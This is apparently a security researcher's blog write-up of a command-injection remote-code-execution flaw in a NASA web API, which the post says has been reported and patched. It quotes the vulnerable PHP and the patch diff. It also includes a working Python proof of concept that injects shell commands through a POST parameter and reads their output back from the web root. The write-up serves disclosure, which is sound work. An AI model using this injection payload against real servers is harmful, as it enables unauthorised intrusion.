---
layout: post
title:  "NASA, Remote Code Excution (0-Day Exploit)"
date:   2022-02-19 12:32:45
description: The article is about 0-day, RCE vulnerability in NASA web service. we could analyze the code of service through the docker file > https://hub.docker.com/r/nasapsg/psg.
imgurl: https://i1.sndcdn.com/avatars-JUvAAPvAA86fmbVE-SH0i6g-t500x500.jpg
excerpt: The psg.gsfc.nasa.gov was very vulnerable to Remote Code Execution. I disclosed this vulnerability in late 2021, and it was patched within a few days
---
### Summary

The psg.gsfc.nasa.gov was very vulnerable to Remote Code Execution. I disclosed this vulnerability in late 2021, and it was patched within a few days

---
### Analysis

```plaintext
docker pull nasapsg/psg
docker run -it -p 3000:3000 nasapsg/psg /bin/sh
```
If you set as above, you can analyze the code.

```plaintext
https://psg.gsfc.nasa.gov/api.php
```
The Remote Code Execution vulnerability occurred in the above URL.

```php
// Define parameters of the run
$wgeo='y';$wephm='n';$watm='n';$whdr='y';$wgen='y';
if (isset($_POST['wgeo']))  $wgeo = $_POST['wgeo'];  else $wgeo = 'y';
if (isset($_POST['wephm'])) $wephm= $_POST['wephm']; else $wephm= 'n';
if (isset($_POST['watm']))  $watm = $_POST['watm'];  else $watm = 'n';
if (isset($_POST['whdr']))  $whdr = $_POST['whdr'];  else $whdr = 'y';
if (isset($_POST['type']))  $otyp = $_POST['type'];  else $otyp = 'rad';
if (isset($_POST['mode']))  $mode = $_POST['mode'];  else $mode = '';
if ($otyp=='set' || $otyp=='upd') exit();
if ($otyp=='cfg' || $otyp=='ret') {                      $wcon='n'; $wgas='n'; $wgen='n';}
if ($otyp=='str' || $otyp=='srf') {$wgeo='n'; $watm='n'; $wcon='y'; $wgas='n'; $wgen='n';}
if ($otyp=='tel') {                $wgeo='n'; $watm='n'; $wcon='n'; $wgas='n'; $wgen='y';}
if ($otyp=='trn' || $otyp=='atm') {                                            $wgen='n';}
if ($otyp=='opc') {                $wgeo='n'; $watm='n'; $wcon='n'; $wgas='y'; $wgen='n';}
if ($otyp=='mss') {                                                            $wgen='y';}

// /var/www/html/api.php
```
When I see the above code, get a value of parameter called wgeo, wephm, watm, whdr, type, mode and I can see that put in each variable.

```php
if (strlen($app)>0) {
  // Call the app
  $app = preg_replace('/[^a-z]/', '', htmlspecialchars(substr($app,0,10),ENT_QUOTES,'UTF-8'));
  system($bindir . $app . ' ' . $ID);
} else {
  // Call the modules
  if ($wgeo=='y' || $wephm!='n') system($bindir . 'geometry ' . $ID . ' ephm=' . $wephm . ' atm=' . $watm);   // Call the geometry module
  if ($watm=='y') system($bindir . 'atmosphere ' . $ID);   // Call the atmosphere model  if ($otyp=='ret') {
    exec($bindir . 'retrieve '  . $ID);                    // Call the retrieval module  } else if ($geo=='massspec' && $wgen=='y') {
      $otyp = 'mss';
      exec($bindir . 'mass '  . $ID);                      // Call the Mass-Spec module  } else {
    if ($wcon=='y') exec($bindir . 'continuum ' . $ID);    // Call the surfaces and transmittance module
    if ($wgas=='y' && $ast!='none') {                      // Call the atmospheric modules
      if ($ast=='coma') {
        exec($bindir . 'cem ' . $ID);                      // Call the cometary emission model
      } else  {
        exec($bindir . 'pumas ' . $ID);                    // Call the planetary radiative transfer module
      }
    }
    if ($wgen=='y') exec($bindir . 'generator ' . $ID);    // Call the flux integrator
  }
}
// /var/www/html/api.php
```
When I see code below, I can see the above code! In the here, When I see to use a system() function in first “if statement” of “else statement”.

In the here, The important information is values of $wephm and $watm variables are passed as the “argument” values of the system() function. This means that a Remote Code Execution attack can be performed by manipulating the variable.

But, I can’t see the result value of system() function because it execute on the server.

<style>
    .myvideo {
        width: auto;
        max-width: 100%;
        height: auto;
    }
</style>
<img src="https://github.com/blogpocas/DATA/blob/main/BB/Nasa/rce/system()/1.png?raw=true" class="myvideo">
Yeah~ They’re using the apache server.

<style>
    .myvideo {
        width: auto;
        max-width: 100%;
        height: auto;
    }
</style>
<img src="https://github.com/blogpocas/DATA/blob/main/BB/Nasa/rce/system()/c.png?raw=true" class="myvideo">
So I decided to create a file containing the return value of the shell command in the apache default path.

```php
$tfile = $_POST['file'];
if (substr($tfile,0,1)!='<') return 0;
$maxlines=2000; $lines[$maxlines]; $iline=0;
$indata=0; $ndat=0; $maxvals=50000; $lams[$maxvals]; $vals[$maxvals]; $evals[$maxvals]; $noise=0;
$b1 = strpos($tfile,'<BINARY>');
if ($b1!==FALSE) {
  $b2 = strpos($tfile,'</BINARY>'); if ($b2<=0) $b2=strlen($tfile);
  $bindata = substr($tfile, $b1+8, $b2-$b1-8);
  if ($bindata!==False) {
    $file = fopen($resdir . 'binaries/' . $ID . '_' . $binname . '.dat', 'w');
    fwrite($file, $bindata);
    fclose($file);
  }
  $tfile = substr($tfile,0,$b1) . substr($tfile,$b2+9,-1);
}
if ($add) $tfile = file_get_contents($resdir . $ID . '_cfg.txt') . $tfile;
$txts = explode(PHP_EOL, $tfile);
if (count($txts)<2) $txts = explode("\r", $tfile);
for ($i=0;$i<count($txts) && $iline<$maxlines && $ndat<$maxvals;$i++) {
  $txt = substr(trim($txts[$i]),0,30000);
  if (strncmp($txt,'<ATMOSPHERE-STRUCTURE>', 22)==0) $ast  = strtolower(substr($txt,22));
  if (strncmp($txt,'<GENERATOR-GAS-MODEL>',  21)==0) $wgas = strtolower(substr($txt,21));
  if (strncmp($txt,'<GENERATOR-CONT-MODEL>', 22)==0) $wcon = strtolower(substr($txt,22));
  if (strncmp($txt,'<GEOMETRY>', 10)==0)             $geo  = strtolower(substr($txt,10));
  if (strncmp($txt,'<DATA>', 6)==0) { $indata=1; continue; }
  if (strncmp($txt,'</DATA>',7)==0) { $indata=0; continue; }
  if ($indata) {
    $nv = sscanf($txt,'%e %e %e', $lam, $flux, $noise); if ($nv<2) continue;
    $lams[$ndat]=$lam;
    $vals[$ndat]=$flux;
    $evals[$ndat]=$noise;
    $ndat++;
  } else {
    if (strncmp($txt,'<',1)!=0) continue;
    $pky = strpos($txt,'>'); if ($pky===false) continue; if ($pky>=strlen($txt)-1) continue;
    $ky  = substr($txt,1,$pky-1);
    $val = substr($txt,$pky+1,strlen($txt)-$pky-1);
    $lines[$iline]='<' . $ky . '>' . $val . PHP_EOL;
    $iline++;
  }
}
if ($iline<=0) exit();
$file = fopen($resdir . $ID . '_cfg.txt', 'w');
for ($i=0;$i<$iline;$i++) fwrite($file, $lines[$i]);
fclose($file);
if ($ndat>0) {
  $file = fopen($resdir . $ID . '_dat.txt', 'w');
  if ($nv>2) for ($i=0;$i<$ndat;$i++) fprintf($file,"%e %e %e\n", $lams[$i], $vals[$i], $evals[$i]); else for ($i=0;$i<$ndat;$i++) fprintf($file,"%e %e\n", $lams[$i], $vals[$i]);
  fclose($file);
}
```
Additionally, before we exploit the above vulnerability, we should know one. If we send a request using the POST method, Server get the value of the file parameter and parse it into a file.

So, at first I passed the data containing random value to the file parameter, but it doesn’t seem to work. It seemed like I had to put the data the parser needed. So I decided to look for a sample file on the NASA site.

<style>
    .myvideo {
        width: auto;
        max-width: 100%;
        height: auto;
    }
</style>
<img src="https://github.com/blogpocas/DATA/blob/main/BB/Nasa/rce/system()/2.png?raw=true" class="myvideo">
I found this, The psg_cfg.txt file can be downloaded from the above URL.

```plaintext
<OBJECT>Exoplanet
<SURFACE-GAS-UNIT>ratio
<GENERATOR-INSTRUMENT>user
```
The value of psg_cfg.txt file are as above. I made some modifications to the file because the values are very long.

```python
import requests

url = "https://psg.gsfc.nasa.gov/api.php"
data = """<OBJECT>Exoplanet
<SURFACE-GAS-UNIT>ratio
<GENERATOR-INSTRUMENT>user """
while True:
    cmd = input(">> ")
    r = requests.post(url,data={"file":data,"wephm":"pocas;{}>graphs/e1xnup1r;echo x".format(cmd)})
    print(requests.get("https://psg.gsfc.nasa.gov/graphs/e1xnup1r").text)
```
The final poc is as above.

<style>
    .myvideo {
        width: auto;
        max-width: 100%;
        height: auto;
    }
</style>
<video class="myvideo" controls="" preload="">
    <source src="https://cdn.pocas.kr/Bug%20Bounty/Remote%20Code%20Execution%20in%20NASA%20(0-Day%20Exploit).mov" type="video/mp4">
</video>

Execute the PoC code and I saw Remote Code Execution happen!

This was a very interesting and amazing! It was a good analysis and experience for me 😉 Thanks for help from [@PewGrand](https://twitter.com/PewGrand), I learn a lot thanks to you!

And Next Day, When I woke up from sleep and checked the vulnerability, it was patched! But they didn’t contact me. So I found out on Twitter that NASA is not responding to the vulnerability. So, if someone just finds it, it is to report it for the purpose of public interest. 😢

```diff
  $wgeo='y';$wephm='n';$watm='n';$whdr='y';$wgen='y';
- if (isset($_POST['wgeo']))  $wgeo = $_POST['wgeo'];  else $wgeo = 'y';
- if (isset($_POST['wephm'])) $wephm= $_POST['wephm']; else $wephm= 'n';
- if (isset($_POST['watm']))  $watm = $_POST['watm'];  else $watm = 'n';
- if (isset($_POST['whdr']))  $whdr = $_POST['whdr'];  else $whdr = 'y';
- if (isset($_POST['type']))  $otyp = $_POST['type'];  else $otyp = 'rad';
- if (isset($_POST['mode']))  $mode = $_POST['mode'];  else $mode = '';
+ if (isset($_POST['wgeo']))  $wgeo = preg_replace('/[^a-z]/', '', substr($_POST['wgeo'],0,1));  else $wgeo = 'y';
+ if (isset($_POST['wephm'])) $wephm= preg_replace('/[^a-z]/', '', substr($_POST['wephm'],0,1)); else $wephm= 'n';
+ if (isset($_POST['watm']))  $watm = preg_replace('/[^a-z]/', '', substr($_POST['watm'],0,1));  else $watm = 'n';
+ if (isset($_POST['whdr']))  $whdr = preg_replace('/[^a-z]/', '', substr($_POST['whdr'],0,1));  else $whdr = 'y';
+ if (isset($_POST['mode']))  $mode = preg_replace('/[^a-z]/', '', substr($_POST['mode'],0,1));  else $mode = '';
  if ($otyp=='set' || $otyp=='upd') exit();
  if ($otyp=='cfg' || $otyp=='ret') {                      $wcon='n'; $wgas='n'; $wgen='n';}
  if ($otyp=='str' || $otyp=='srf') {$wgeo='n'; $watm='n'; $wcon='y'; $wgas='n'; $wgen='n';}
  if ($otyp=='tel') {                $wgeo='n'; $watm='n'; $wcon='n'; $wgas='n'; $wgen='y';}
# /var/www/html/api.php
```
This issue was fixed that add substr() function. So I thought I try bypass this. But I decided not to do after to see the patch code.  this is impossible to bypass.

---
### Reporting Timeline

- 2021-11-22 13h 03m : Reported this issue via the [soc@nasa.gov](mailto:soc@nasa.gov).
- 2021-11-23 ??h ??m : Patched this issue
- 2022-02-14 ??h ??m : Released a [docker file](https://hub.docker.com/r/nasapsg/psg)
